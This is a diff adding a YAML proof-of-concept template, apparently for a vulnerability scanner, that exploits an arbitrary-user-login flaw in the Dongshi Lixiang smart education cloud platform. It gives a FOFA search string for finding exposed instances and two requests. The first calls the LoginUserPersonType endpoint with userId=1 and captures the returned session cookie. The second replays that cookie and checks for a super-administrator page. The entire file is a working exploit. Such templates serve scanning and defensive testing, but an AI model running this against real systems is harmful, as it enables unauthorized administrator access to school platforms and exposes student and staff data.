@@ -1,0 +1,22 @@
+id: poc-yaml-dslxzhjy-cloud-platform-loginuserpersontype-anyuser-login
+info:
+  name: 东师理想智慧教育云平台 LoginUserPersonType 任意用户登录漏洞
+  severity: high
+  tags:
+  - 权限绕过
+  finger: 东师理想智慧教育云平台
+  fofa: body="一个让学生热爱学习的APP应用"
+requests:
+- method: GET
+  path: /Account/LoginUserPersonType?userId=1
+  expression: status_code == 200 && contains(body,`{"success":true}`)
+  output:
+  - regex_match(headers,".AspNet.UCApplicationCookie(?P<cookie>.*?);")
+- method: GET
+  path: /
+  headers:
+    Cookie: .AspNet.UCApplicationCookie{{.cookie}}
+  expression: status_code == 200 && contains(body,"超级管理员") && contains(body,"用户中心")
+    && contains(body,"注销")
+variables: {}
+transport: http
